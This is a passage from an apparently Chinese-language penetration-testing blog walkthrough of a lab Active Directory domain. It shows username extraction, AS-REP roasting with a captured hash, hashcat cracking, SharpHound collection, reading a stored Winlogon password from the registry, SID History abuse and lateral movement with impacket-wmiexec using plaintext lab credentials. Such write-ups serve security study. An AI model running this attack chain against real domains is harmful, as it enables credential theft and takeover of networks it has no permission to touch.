</span></span><span class=line><span class=cl>    <span class=nv>usernames</span> <span class=o>=</span> <span class=o>[]</span>
</span></span><span class=line><span class=cl>    with open<span class=o>(</span>filename, <span class=s1>&#39;r&#39;</span>, <span class=nv>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=o>)</span> as f:
</span></span><span class=line><span class=cl>        <span class=nv>lines</span> <span class=o>=</span> f.readlines<span class=o>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># 跳过表头和分隔线</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> line in lines<span class=o>[</span>3:<span class=o>]</span>:  <span class=c1># 跳过前3行（表头和分隔线）</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;+-----+&#39;</span> in line:  <span class=c1># 跳过底部分隔线</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=nv>parts</span> <span class=o>=</span> line.split<span class=o>(</span><span class=s1>&#39;|&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> len<span class=o>(</span>parts<span class=o>)</span> &gt;<span class=o>=</span> 3:  <span class=c1># 确保行有足够的列</span>
</span></span><span class=line><span class=cl>                <span class=nv>email_part</span> <span class=o>=</span> parts<span class=o>[</span>2<span class=o>]</span>.strip<span class=o>()</span>  <span class=c1># 第二列是email (索引从1开始，所以是parts[2])</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s1>&#39;@xiaorang.lab&#39;</span> in email_part:
</span></span><span class=line><span class=cl>                    <span class=nv>username</span> <span class=o>=</span> email_part.split<span class=o>(</span><span class=s1>&#39;@&#39;</span><span class=o>)[</span>0<span class=o>]</span>.strip<span class=o>()</span>
</span></span><span class=line><span class=cl>                    usernames.append<span class=o>(</span>username<span class=o>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> usernames
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def save_usernames<span class=o>(</span>usernames, <span class=nv>output_file</span><span class=o>=</span><span class=s1>&#39;usernames.txt&#39;</span><span class=o>)</span>:
</span></span><span class=line><span class=cl>    with open<span class=o>(</span>output_file, <span class=s1>&#39;w&#39;</span>, <span class=nv>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=o>)</span> as f:
</span></span><span class=line><span class=cl>        <span class=k>for</span> username in usernames:
</span></span><span class=line><span class=cl>            f.write<span class=o>(</span>username + <span class=s1>&#39;\n&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    print<span class=o>(</span>f<span class=s1>&#39;已成功提取 {len(usernames)} 个用户名并保存到 {output_file}&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span>:
</span></span><span class=line><span class=cl>    <span class=nv>input_file</span> <span class=o>=</span> <span class=s2>&#34;1.txt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nv>usernames</span> <span class=o>=</span> extract_usernames<span class=o>(</span>input_file<span class=o>)</span>
</span></span><span class=line><span class=cl>    save_usernames<span class=o>(</span>usernames<span class=o>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 打印前5个提取的用户名以验证</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> usernames:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;\n提取的前5个用户名示例:&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> i in range<span class=o>(</span>min<span class=o>(</span>5, len<span class=o>(</span>usernames<span class=o>)))</span>:
</span></span><span class=line><span class=cl>            print<span class=o>(</span>usernames<span class=o>[</span>i<span class=o>])</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;\n没有提取到任何用户名，请检查文件格式!&#34;</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>利用获取到的用户进行ASREPRoast攻击。</p><blockquote><p>Kerberos认证协议的一个特性，枚举不要求Kerberos预身份验证的域用户(默认不关闭)，但是关闭了之后，就可以使用指定用户向域控制器的Kerberos 88端口请求票据，此时域控不会进行任何验证就将TGT和该用户Hash加密的Login Session Key 返回。进行离线破解，得到账户密码</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile usernames.txt xiaorang.lab/
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-time/2.png width=1689 height=729 loading=lazy alt=1></p><p>得到hash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$krb5asrep$23$zhangxin</span>@XIAORANG.LAB:8f3e18c2b8cd843f2aeb7d6ff8d7dc4c<span class=nv>$26</span>e42387c6eb91347301ddd17ebd396e1bf4ff872d75407f9eb071d9e0bb7385ea91ebacd124c42a05f1ec0a1d38110d71f38c19bffd02b13c38f39605c67a4ee2f4de52131eefccfabe09920a57b559ff90d497443efff9afa5e9b4893c11ec949c018496341c2e3ba9a97da3ed40ee2b24fcb2dd040834317dd71f8b808e6542585aab3fffdb3d564934fdf9a470b7095bd74b6060dc203812f9fe173dab6ed6b01a4a3de9ff59c780ffbd9a8af5ff06cbaf304a5a754bf57e0b3f13475759288ed005e3d7a468f1ea218111079f9612bafae991edc654db5be4a4effe4259129c0753ac279e8306a4afda
</span></span></code></pre></td></tr></table></div></div><p>用hashcat来破解，<code>.\hashcat -m 18200 1 -a 0 ./rockyou.txt --force</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zhangxin@xiaorang.lab
</span></span><span class=line><span class=cl>strawberry
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-time/3.png width=1437 height=750 loading=lazy alt=1></p><p>发现是域用户，进行域内信息收集，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\z</span>hangxin<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>SharpHound.exe -c all
</span></span></code></pre></td></tr></table></div></div><p><code>query user</code>发现有其他用户会话</p><p><img src=/p/springautumn-cloudmirror-time/4.png width=1152 height=243 loading=lazy alt=1></p><p>查询注册表看看存没存默认的用户密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reg query <span class=s2>&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    DefaultUserName    REG_SZ    yuxuan
</span></span><span class=line><span class=cl>    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L
</span></span><span class=line><span class=cl>    DefaultDomainName    REG_SZ    xiaorang.lab
</span></span></code></pre></td></tr></table></div></div><p>现在来看看域内信息图</p><p><img src=/p/springautumn-cloudmirror-time/5.png width=709 height=628 loading=lazy alt=1></p><blockquote><p>The user <a class=link href=mailto:YUXUAN@XIAORANG.LAB>YUXUAN@XIAORANG.LAB</a> has, in its SIDHistory attribute, the SID for the user <a class=link href=mailto:ADMINISTRATOR@XIAORANG.LAB.userYUXUAN>ADMINISTRATOR@XIAORANG.LAB.userYUXUAN</a>@XIAORANG.LAB</p><p>在其 SIDHistory 属性中具有 <a class=link href=mailto:theuserADMINISTRATOR@XIAORANG.LAB>theuserADMINISTRATOR@XIAORANG.LAB</a> 的 SID。</p><p>When a kerberos ticket is created for <a class=link href=mailto:YUXUAN@XIAORANG.LAB>YUXUAN@XIAORANG.LAB</a>, it will include the SID for <a class=link href=mailto:ADMINISTRATOR@XIAORANG.LAB>ADMINISTRATOR@XIAORANG.LAB</a>, and therefore <a class=link href=mailto:grantYUXUAN@XIAORANG.LAB>grantYUXUAN@XIAORANG.LAB</a> the same privileges and permissions <a class=link href=mailto:asADMINISTRATOR@XIAORANG.LAB>asADMINISTRATOR@XIAORANG.LAB</a>.为 YUXUAN@XIAORANG</p><p>创建 kerberos 票证时。LAB 的 SID 中，它将包括 ADMINISTRATOR@XIAORANG 的 SID。LAB grantYUXUAN@XIAORANG <a class=link href=mailto:asADMINISTRATOR@XIAORANG.LAB>asADMINISTRATOR@XIAORANG.LAB</a> 具有相同的特权和权限。</p></blockquote><p>也就是说我们现在手里的这个yuxuan用户是已经被SID History攻击过后的产物，他已经是域管理员了</p><p>登录yuxuan，看看用户组<code>whoami /groups</code></p><p><img src=/p/springautumn-cloudmirror-time/6.png width=1441 height=732 loading=lazy alt=1></p><p>直接横向即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-wmiexec XIAORANG/yuxuan:Yuxuan7QbrgZ3L@172.22.6.25 -codec gbk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>impacket-wmiexec XIAORANG/yuxuan:Yuxuan7QbrgZ3L@172.22.6.12 -codec gbk
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pentest/>Pentest</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>